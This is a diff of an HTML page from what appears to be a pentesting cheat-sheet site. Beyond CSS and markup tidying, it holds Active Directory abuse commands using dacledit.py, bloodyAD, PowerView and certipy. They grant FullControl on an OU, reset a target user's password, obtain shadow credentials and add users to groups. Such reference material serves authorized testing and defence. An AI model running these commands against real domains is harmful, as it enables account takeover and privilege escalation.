@@ -44,16 +44,20 @@
 </div>
     
 <style>
+ 
 
  
+.js-toggle-wrapper, .js-toggle {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    box-sizing: border-box;
+}
 
 .js-toggle-wrapper {
     display: table;
-
-     
     float: right;
     margin-left: auto;
-    margin-right: 0;
 }
 
 .js-toggle {
@@ -62,76 +66,60 @@
     position: relative;
     cursor: pointer;
     background-color: transparent;
-    border: 0;
-    padding: 0;
-    -webkit-touch-callout: none;
     user-select: none;
-    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
-    -webkit-tap-highlight-color: transparent;
-  }
-  
-  .js-toggle-screenreader-only {
-    border: 0;
-    clip: rect(0 0 0 0);
-    height: 1px;
-    margin: -1px;
-    overflow: hidden;
-    padding: 0;
+}
+
+.js-toggle-screenreader-only {
     position: absolute;
     width: 1px;
-  }
-  
-  .js-toggle-track {
+    height: 1px;
+    margin: -1px;
+    padding: 0;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+}
+
+.js-toggle-track {
     width: 50px;
     height: 24px;
-    padding: 0;
     border-radius: 30px;
     background-color: hsl(223, 61%, 44%);
-    transition: all 0.2s ease;
-  }
-  
-  .js-toggle-track-check {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    left: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 0;
-    transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-    transition: opacity 0.25s ease;
-  }
+    transition: background-color 0.2s ease;
+}
 
-  .js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-  }
-  
-  .js-toggle-track-x {
+.js-toggle-track-check,
+.js-toggle-track-x {
     position: absolute;
     width: 17px;
     height: 17px;
-    right: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 1;
+    top: 50%;
+    transform: translateY(-50%);
     transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-x {
+}
+
+.js-toggle-track-check {
+    left: 5px;
     opacity: 0;
-  }
-  
-  .js-toggle-thumb {
+}
+
+.js-toggle--checked .js-toggle-track-check {
+    opacity: 1;
+}
+
+.js-toggle-track-x {
+    right: 5px;
+    opacity: 1;
+}
+
+.js-toggle--checked .js-toggle-track-x {
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track {
+    background-color: hsl(222, 14%, 7%);
+}
+
+.js-toggle-thumb {
     position: absolute;
     top: 1px;
     left: 1px;
@@ -139,15 +127,12 @@
     height: 22px;
     border-radius: 50%;
     background-color: #fafafa;
-    box-sizing: border-box;
-    transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1) 0ms;
-    transform: translateX(0);
-  }
-  
-  .js-toggle--checked .js-toggle-thumb {
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+}
+
+.js-toggle--checked .js-toggle-thumb {
     transform: translateX(26px);
-    border-color: #19ab27;
-  }
+}
 </style>
 
 <script>
@@ -176,7 +161,6 @@
         switcher.classList.add('js-toggle--checked');
         body.classList.add('dark-mode');
     }
-
 </script>
   <p class="desc"></p>
 </header>
@@ -197,7 +181,7 @@
 </ul>
 <hr>
 <div class="content">
-<div id="dynamicFormContainer">
+  <div id="dynamicFormContainer">
 	<form id="dynamicForm" style="display: none;">
 	</form>
 	<div class="buttons center">
@@ -337,86 +321,60 @@ body.dark-mode #dynamicFormContainer button:hover {
     cursor: pointer;
     background: #424242;
 }
-
-
 </style>
-<h3 id="abuse-1-change-target-user-password">Abuse #1: Change target user password</h3>
+  <h3 id="abuse-1-change-target-user-password">Abuse #1: Change target user password</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy-optional">0. Install latest impacket (included dacledit.py) [optional]</h4>
-<div>
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy">0. Install latest impacket (included dacledit.py)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone https://github.com/fortra/impacket.git
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install .
-</span></span></span></code></pre></div></div>
-<h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
-<div>
+</span></span></span></code></pre></div><h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target-dn &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -inheritance -action write -rights FullControl
-</span></span></span></code></pre></div></div>
-<h4 id="2-change-password">2. Change password</h4>
-<p><button data-tabset="set2" data-tabcontent="tab1" class="active">BloodyAD</button></p>
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; set password &lt;TARGET_USER&gt; &lt;NEW_PASSWORD&gt;
-</span></span></span></code></pre></div></div>
-<p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
+</span></span></span></code></pre></div><h4 id="2-change-password">2. Change password</h4>
+<p><button data-tabset="set1-1" data-tabcontent="tab1" class="active">bloodyAD</button></p>
+<div class="tabcontent" data-tabset="set1-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; set password &lt;TARGET_USER&gt; &lt;NEW_PASSWORD&gt;
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
-<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div></div>
-<h4 id="2-change-target-user-password">2. Change target user password</h4>
-<div>
+</span></span></span></code></pre></div><h4 id="2-change-target-user-password">2. Change target user password</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString &lt;PASSWORD&gt; -AsPlainText -Force 
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainUserPassword -Identity &lt;TARGET_USER&gt; -AccountPassword $password
-</span></span></span></code></pre></div></div>
-</div></p>
-<br>
+</span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="abuse-2-get-shadow-credentials">Abuse #2: Get shadow credentials</h3>
 <p>
 <button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>
 
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy-optional">0. Install latest impacket (included dacledit.py) [optional]</h4>
-<div>
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy">0. Install latest impacket (included dacledit.py)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone https://github.com/fortra/impacket.git
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install .
-</span></span></span></code></pre></div></div>
-<h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
-<div>
+</span></span></span></code></pre></div><h4 id="1-add-full-control-to-current-user">1. Add Full Control to current user</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">dacledit.py -k &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target-dn &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -inheritance -action write -rights FullControl
-</span></span></span></code></pre></div></div>
-<h4 id="2-get-shadow-credentials">2. Get shadow credentials</h4>
-<div>
+</span></span></span></code></pre></div><h4 id="2-get-shadow-credentials">2. Get shadow credentials</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad shadow auto -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &#39;&lt;PASSWORD&gt;&#39; -k -account &lt;TARGET_USER&gt; -target &lt;DC&gt;
-</span></span></span></code></pre></div></div>
-</div></p>
-<br>
+</span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="abuse-3--add-user-to-group">Abuse #3 : Add user to group</h3>
 <p>
 <button data-tabset="set4" data-tabcontent="tab1" class="active">Windows</button>
 
-<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
-<div>
+<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div></div>
-<h4 id="2-create-cred-object-runas-optional">2. Create cred object (runas) [optional]</h4>
-<div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s2">&#34;&lt;DOMAIN&gt;\&lt;USER&gt;&#34;</span>
+</span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
-</span></span></code></pre></div></div>
-<h4 id="2-add-user-to-group">2. Add user to group</h4>
-<div>
+</span></span></code></pre></div><h4 id="2-add-user-to-group">2. Add user to group</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &lt;TARGET_GROUP&gt; -Members &lt;USER&gt; -Credential $cred
-</span></span></span></code></pre></div></div>
-</div></p>
-<br>
+</span></span></span></code></pre></div></div></p>
+
 </div></div>
     
     <script src="/js/utils.js"></script>
@@ -424,8 +382,6 @@ body.dark-mode #dynamicFormContainer button:hover {
     <hr>
     <div class="footer-text">
         <div>© 2024 TLDRBins</div>
-        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
-                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
     </div>
 </footer>
 </body>
